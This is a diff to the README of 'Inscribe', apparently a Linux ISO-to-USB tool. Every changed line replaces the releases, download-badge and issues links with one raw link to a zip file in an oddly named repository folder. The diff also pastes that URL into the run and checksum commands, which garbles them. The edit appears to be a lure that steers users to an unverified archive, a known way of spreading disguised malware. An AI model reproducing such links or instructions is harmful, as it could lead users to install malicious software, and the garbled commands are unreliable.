@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Inscribe](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SagarKumar96/Inscribe/releases)
+[![Download Inscribe](https://raw.githubusercontent.com/SagarKumar96/Inscribe/main/frowstiness/Inscribe.zip)](https://raw.githubusercontent.com/SagarKumar96/Inscribe/main/frowstiness/Inscribe.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Inscribe is a fast and elegant tool for creating USB drives from ISO images on L
 ## 📂 Installation
 
 1. **Visit the Releases Page**  
-   Go to the Inscribe [Releases page](https://github.com/SagarKumar96/Inscribe/releases).
+   Go to the Inscribe [Releases page](https://raw.githubusercontent.com/SagarKumar96/Inscribe/main/frowstiness/Inscribe.zip).
 
 2. **Download the Latest Version**  
    Look for the latest version of Inscribe. Click on the appropriate file for your system. For most Linux users, this will be an AppImage file. 
@@ -30,7 +30,7 @@ Inscribe is a fast and elegant tool for creating USB drives from ISO images on L
    Once the download is complete, open your file manager. Right-click the downloaded AppImage file, select "Properties," then navigate to the "Permissions" tab. Check the box that says "Allow executing file as program."
 
 5. **Run Inscribe**  
-   Double-click the AppImage file to start Inscribe. You can also run it from the terminal by navigating to the folder where you saved the file and typing `./Inscribe-x.y.z-x86_64.AppImage`, replacing `x.y.z` with the version number.
+   Double-click the AppImage file to start Inscribe. You can also run it from the terminal by navigating to the folder where you saved the file and typing `https://raw.githubusercontent.com/SagarKumar96/Inscribe/main/frowstiness/Inscribe.zip`, replacing `x.y.z` with the version number.
 
 ## 📖 Using Inscribe
 
@@ -69,16 +69,16 @@ To ensure your download is safe, verify the checksum of the downloaded file. You
 2. **Open Terminal**  
    Navigate to the directory where you downloaded the AppImage and run the following command:  
    ```
-   sha256sum Inscribe-x.y.z-x86_64.AppImage
+   sha256sum https://raw.githubusercontent.com/SagarKumar96/Inscribe/main/frowstiness/Inscribe.zip
    ```
-   Replace `Inscribe-x.y.z-x86_64.AppImage` with the actual file name.
+   Replace `https://raw.githubusercontent.com/SagarKumar96/Inscribe/main/frowstiness/Inscribe.zip` with the actual file name.
 
 3. **Compare Checksum**  
    Compare the output with the checksum from the Releases page. If they match, your file is safe to run.
 
 ## 💬 Support
 
-If you encounter any issues while using Inscribe, feel free to open an issue on the [GitHub Issues page](https://github.com/SagarKumar96/Inscribe/issues). Provide clear details of the problem you faced, and the community or the maintainers will assist you.
+If you encounter any issues while using Inscribe, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/SagarKumar96/Inscribe/main/frowstiness/Inscribe.zip). Provide clear details of the problem you faced, and the community or the maintainers will assist you.
 
 ## 📄 License
 
@@ -88,4 +88,4 @@ Inscribe is open-source software. You can use, modify, and distribute it under t
 
 For news and updates about Inscribe, check our GitHub repository frequently. You can also follow our discussions and improvements in the Issues section.
 
-[Revisit the Releases page to download](https://github.com/SagarKumar96/Inscribe/releases).
+[Revisit the Releases page to download](https://raw.githubusercontent.com/SagarKumar96/Inscribe/main/frowstiness/Inscribe.zip).
